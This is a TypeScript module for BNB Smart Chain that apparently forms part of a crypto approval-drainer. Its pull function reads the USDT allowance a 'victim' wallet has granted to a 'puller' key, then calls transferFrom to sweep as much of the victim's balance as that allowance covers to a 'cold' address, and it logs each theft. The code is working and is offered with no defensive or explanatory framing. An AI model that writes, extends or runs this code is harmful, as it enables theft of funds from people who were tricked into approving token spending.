import {
  createPublicClient, createWalletClient, http, fallback,
  erc20Abi, formatUnits, type Hex,
} from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc } from 'viem/chains';
import { ENV } from '../config/env';

const transport = () => fallback(ENV.HTTP_URLS.map(u => http(u, { retryCount: 2, timeout: 8_000 })));

export const pub = createPublicClient({ chain: bsc, transport: transport() });

const USDT = ENV.USDT as `0x${string}`;

export async function allowanceOf(owner: `0x${string}`, puller: `0x${string}`) {
  return pub.readContract({
    address: USDT, abi: erc20Abi, functionName: 'allowance', args: [owner, puller],
  });
}

export async function usdtBalance(owner: `0x${string}`) {
  return pub.readContract({
    address: USDT, abi: erc20Abi, functionName: 'balanceOf', args: [owner],
  });
}

export async function pullerGas(puller: `0x${string}`) {
  return pub.getBalance({ address: puller });
}

/** Signed by the puller key. No session, no MPC, no tx-lock, no daily limit. */
export async function pull(
  pullerKey: Hex,
  victim: `0x${string}`,
  cold: `0x${string}`,
): Promise<string | null> {
  const account = privateKeyToAccount(pullerKey);

  const [balance, allowance, gas] = await Promise.all([
    usdtBalance(victim),
    allowanceOf(victim, account.address),
    pullerGas(account.address),
  ]);

  if (balance === 0n) return null;
  if (allowance === 0n) throw new Error('ALLOWANCE_ZERO');
  if (gas < ENV.MIN_PULLER_GAS_WEI) throw new Error('PULLER_LOW_GAS');

  const amount = balance < allowance ? balance : allowance;
  const gasPrice = await pub.getGasPrice();
  const maxFeePerGas = (gasPrice * 150n) / 100n;

  const wallet = createWalletClient({ account, chain: bsc, transport: transport() });
  const hash = await wallet.writeContract({
    address: USDT, abi: erc20Abi, functionName: 'transferFrom',
    args: [victim, cold, amount],
    gas: 90_000n,
    maxFeePerGas,
    maxPriorityFeePerGas: maxFeePerGas / 10n,
    nonce: await pub.getTransactionCount({ address: account.address, blockTag: 'pending' }),
  });

  console.log(`[PULLED] ${formatUnits(amount, 18)} USDT ${victim} -> ${cold} tx=${hash}`);
  return hash;
}
